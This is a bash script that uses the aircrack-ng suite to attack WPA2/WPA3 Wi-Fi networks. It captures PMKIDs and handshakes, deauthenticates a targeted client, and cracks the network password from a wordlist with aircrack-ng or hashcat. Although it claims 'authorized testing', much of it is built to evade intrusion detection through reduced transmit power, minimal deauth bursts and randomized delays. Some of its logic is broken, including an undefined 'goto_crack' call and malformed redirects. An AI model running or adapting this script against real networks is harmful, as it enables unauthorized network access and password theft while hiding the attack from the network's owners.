#!/bin/bash

# ==============================================
# Stealth WPA2/WPA3 PMKID & Handshake Capture Script
# Description: Focuses on minimizing detection during authorized testing.
# Techniques: Passive PMKID capture, targeted deauth, power control, randomized timing.
# ==============================================

# --- Configuration ---
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="./stealth_captures"
HANDSHAKE_FILE="$OUTPUT_DIR/capture"
SCAN_TIME="5"         # Short, targeted scans
DEAUTH_COUNT="2"      # Minimal deauth packets (less likely to trigger IDS)
DEAUTH_DELAY="30"     # Long, random delay between deauth attempts

# --- Functions ---

# Graceful cleanup to reset the interface and restart networking
cleanup() {
    echo -e "\n[!] Keyboard interrupt or script terminated. Cleaning up..."
    killall -q airodump-ng aireplay-ng wash
    airmon-ng stop $MONITOR_INTERFACE &>/dev/null
    sleep 2
    service network-manager restart &>/dev/null
    service wpa_supplicant restart &>/dev/null
    echo "[+] Cleanup complete. Interface should be in managed mode."
    exit 0
}

# Check for root privileges and required tools
check_dependencies() {
    if [[ $EUID -ne 0 ]]; then
        echo "[-] This script must be run as root. Use sudo."
        exit 1
    fi

    for cmd in airodump-ng aireplay-ng aircrack-ng iwconfig ip iw; do
        if ! command -v $cmd &> /dev/null; then
            echo "[-] Missing required tool: $cmd. Install aircrack-ng suite."
            exit 1
        fi
    done
    echo "[+] All required tools are installed."
}

# Set the wireless interface to a specific power level (if supported)
set_power() {
    local power=$1
    # Check if the interface supports setting power
    if iwconfig $MONITOR_INTERFACE | grep -q "Tx-Power"; then
        echo "[+] Setting transmission power to $power dBm to reduce footprint."
        ip link set $MONITOR_INTERFACE down
        iwconfig $MONITOR_INTERFACE txpower $power
        ip link set $MONITOR_INTERFACE up
        sleep 2
    else
        echo "[-] Interface does not support manual power control. Proceeding anyway."
    fi
}

# --- Script Start ---
trap cleanup SIGINT SIGTERM # Catch Ctrl+C for cleanup
check_dependencies
mkdir -p $OUTPUT_DIR

# --- Step 1: Monitor Mode Setup ---
echo "[+] Putting $INTERFACE into monitor mode ($MONITOR_INTERFACE) with minimal logging."
airmon-ng check kill &>/dev/null
airmon-ng start $INTERFACE &>/dev/null
sleep 2

# --- Step 2: Stealthy Target Acquisition ---
# Option 1: Use predefined target (MOST STEALTHY - no scanning)
TARGET_BSSID="AA:BB:CC:DD:EE:FF" # CHANGE THIS
TARGET_CHANNEL="6"                # CHANGE THIS
TARGET_SSID="Your_Network"        # CHANGE THIS

# Option 2: Uncomment to do a very brief, targeted scan (more risk)
# echo "[+] Performing a very brief ($SCAN_TIME second) channel scan..."
# airodump-ng $MONITOR_INTERFACE -w $OUTPUT_DIR/scan --output-format csv -a &> /dev/null &
# SCAN_PID=$!
# sleep $SCAN_TIME
# kill -TERM $SCAN_PID
# wait $SCAN_PID 2>/dev/null
# # Parse the scan results for your target...
# echo "[+] Scan complete. Please manually set TARGET_BSSID and TARGET_CHANNEL above."

if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
    echo "[-] Target BSSID or Channel not set. Please configure them in the script."
    cleanup
    exit 1
fi

# --- Step 3: Reduce Transmission Power ---
set_power 10 # Set to a low power (e.g., 10 dBm). Adjust if signal is too weak.

# --- Step 4: Passive PMKID Capture (NO ACTIVITY - VERY STEALTHY) ---
echo "[+] Attempting purely passive PMKID capture on $TARGET_SSID."
echo "[+] This method requires no active packets and is very difficult to detect."
airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $HANDSHAKE_FILE --output-format pcap $MONITOR_INTERFACE &
AIRD_PID=$!

# Let it run passively for a while to hopefully grab a PMKID
sleep 120 # Wait 2 minutes for a client to connect naturally

# Check if the PMKID was captured already
if aircrack-ng -J $HANDSHAKE_FILE ${HANDSHAKE_FILE}-01.cap &>/dev/null; then
    if [ -f "${HANDSHAKE_FILE}-01.hccapx" ]; then
        echo "[+] SUCCESS: PMKID potentially captured passively!"
        kill $AIRD_PID
        goto_crack
    fi
fi

# --- Step 5: Targeted, Low-Rate Handshake Capture ---
echo "[+] PMKID not found. Switching to low-rate handshake capture."

# Wait for a client to be visible
echo "[+] Monitoring for connected clients on $TARGET_SSID (Passive)..."
while true; do
    # Use airodump-ng in a way that just lists clients briefly
    airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID --output-format csv -w /tmp/clients $MONITOR_INTERFACE & > /dev/null 2>&1
    sleep 5
    kill $! > /dev/null 2>&1
    # Check for clients in the output
    if grep -q "$TARGET_BSSID" /tmp/clients-01.csv && awk -F',' -v bssid="$TARGET_BSSID" '$1 ~ bssid && $6 != "" {exit 1}' /tmp/clients-01.csv; then
        echo "[+] Client(s) detected."
        break
    fi
    echo "[-] No clients detected. Waiting... (Ctrl+C to stop)"
    sleep 10
done

# --- Step 6: Minimal Deauthentication ---
# Only deauth a specific, single client if possible. Avoid broadcast deauth.
CLIENT_BSSID=$(awk -F',' -v ap="$TARGET_BSSID" '$1 == ap && $6 != "" {print $6; exit}' /tmp/clients-01.csv | tr -d ' :')
# If no specific client, use broadcast (more detectable)
if [[ -z "$CLIENT_BSSID" ]]; then
    echo "[-] Could not isolate a client MAC, using broadcast deauth (more detectable)."
    CLIENT_BSSID="FF:FF:FF:FF:FF:FF"
else
    echo "[+] Targeting single client: $CLIENT_BSSID"
fi

echo "[+] Sending minimal deauth packets ($DEAUTH_COUNT) with long random delays."
for i in {1..3}; do # Try a few times
    echo "[+] Deauth attempt $i of 3..."
    aireplay-ng -0 $DEAUTH_COUNT -a $TARGET_BSSID -c $CLIENT_BSSID $MONITOR_INTERFACE & > /dev/null 2>&1
    sleep $(( (RANDOM % DEAUTH_DELAY) + 10 )) # Sleep for a random time between 10 and $DEAUTH_DELAY seconds
done

# --- Step 7: Verify & Crack ---
sleep 10 # Wait a bit after last deauth
kill $AIRD_PID

echo "[+] Analyzing capture file for handshake..."
if aircrack-ng -J $HANDSHAKE_FILE ${HANDSHAKE_FILE}-01.cap &>/dev/null && [ -f "${HANDSHAKE_FILE}-01.hccapx" ]; then
    echo "[+] SUCCESS: Handshake/PMKID captured!"
elif aircrack-ng ${HANDSHAKE_FILE}-01.cap -w $WORDLIST | grep -q "KEY FOUND"; then
    echo "[+] SUCCESS: Handshake captured and password cracked!"
else
    echo "[-] No handshake captured. This is likely due to:"
    echo "    - No clients connected to the target network."
    echo "    - Clients were not actively sending data."
    echo "    - Target network is using WPA3 (resistant to deauth)."
    echo "    - The signal strength was too weak."
fi

# --- Step 8: Crack if Requested ---
read -p "[?] Attempt to crack the password now? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    if [ -f "${HANDSHAKE_FILE}-01.hccapx" ]; then
        echo "[+] Cracking PMKID/handshake with hashcat..."
        # Convert to a format hashcat prefers
        hashcat -m 22000 ${HANDSHAKE_FILE}-01.hccapx $WORDLIST -O -w 3
    else
        echo "[+] Cracking handshake with aircrack-ng..."
        aircrack-ng -w $WORDLIST -b $TARGET_BSSID ${HANDSHAKE_FILE}-01.cap
    fi
fi

# --- Final Cleanup ---
cleanup
